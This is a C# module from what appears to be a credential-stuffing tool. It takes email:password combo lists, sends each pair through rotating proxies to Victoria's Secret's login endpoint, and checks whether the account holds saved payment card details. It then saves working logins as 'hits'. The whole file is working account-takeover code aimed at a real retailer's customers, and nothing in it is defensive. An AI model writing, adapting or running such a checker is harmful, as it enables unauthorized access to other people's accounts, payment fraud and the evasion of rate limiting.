using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using UHQKEK.Start;

namespace UHQKEK.Modules.Capture
{
    class victoriassecretcap
    {
        public static bool check(string combo)
        {
            try
            {
                HttpRequest httpRequest = new HttpRequest()
                {
                    IgnoreProtocolErrors = true,
                    KeepAlive = true,
                    ConnectTimeout = 10000,
                    AllowAutoRedirect = true
                };
                string[] strArray1 = combo.Split(':', ';', '|');
                string[] strArray2 = Program.Proxies.ElementAt<string>(new Random().Next(0, Program.Proxies.Count)).Split(':', ';', '|');
                ProxyClient proxyClient = Program.Proxytype == ProxyType.Socks5 ? new Socks5ProxyClient(strArray2[0], int.Parse(strArray2[1])) : Program.Proxytype == ProxyType.Socks4 ? new Socks4ProxyClient(strArray2[0], int.Parse(strArray2[1])) : (ProxyClient)new HttpProxyClient(strArray2[0], int.Parse(strArray2[1]));
                if (strArray2.Length == 4)
                {
                    proxyClient.Username = strArray2[2];
                    proxyClient.Password = strArray2[3];
                }
                httpRequest.Proxy = proxyClient;
                httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback)((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
                httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36");
                httpRequest.AddHeader("Accept", "*/*");
                string str1 = httpRequest.Get("https://www.victoriassecret.com/").ToString();
                httpRequest.ClearAllHeaders();
                httpRequest.AddHeader("Host", "api.victoriassecret.com");
                httpRequest.AddHeader("Origin", "https://www.victoriassecret.com");
                httpRequest.AddHeader("Referer", "https://www.victoriassecret.com/");
                httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36");
                string str2 = httpRequest.Post("https://www.victoriassecret.com/account/logon", "{\"email\":\"" + strArray1[0] + "\", \"password\":\"" + strArray1[1] + "\", \"source\":\"VS\"}", "application/x-www-form-urlencoded").ToString();
                httpRequest.ClearAllHeaders();
                httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36");
                httpRequest.AddHeader("Accept", "*/*");
                string str3 = httpRequest.Get("https://www.victoriassecret.com/account/signin").ToString();
                if (str3.Contains("Sign In"))
                {
                    ++Program.Fail;
                    ++Program.Check;
                    ++Program.Cps;
                    Program.remove(combo);
                    if (Program.Lock == "Y")
                    {
                        Console.WriteLine("[-]" + combo, Color.Red);
                    }
                    return true;
                }
                else if (str3.Contains("Sign Out"))
                {
                    string payinfo = Cryptography.LR(str3, "<div class=\"cardInfo\">", "</div>").FirstOrDefault();
                    if (!payinfo.Contains("Ending"))
                    {
                        Interlocked.Increment(ref Program.Good);
                        ++Program.Check;
                        ++Program.Cps;
                        if (Program.Lock == "Y")
                        {
                            Console.WriteLine($" [+] {combo}", Color.Green);
                        }
                        Program.Save(combo, "ShakeShack Hits");
                        return true;
                    }
                    else
                    {
                        ++Program.Free;
                        ++Program.Check;
                        ++Program.Cps;
                        if (Program.Lock == "Y")
                        {
                            Console.WriteLine($" [+] {combo}", Color.Orange);
                        }
                        Program.Save(combo, "ShakeShack free");
                        return true;
                    }

                }
                else
                {
                    ++Program.Retrie;
                    return false;
                }
            }
            catch
            {
                ++Program.Retrie;
                return false;
            }
        }
    }
}
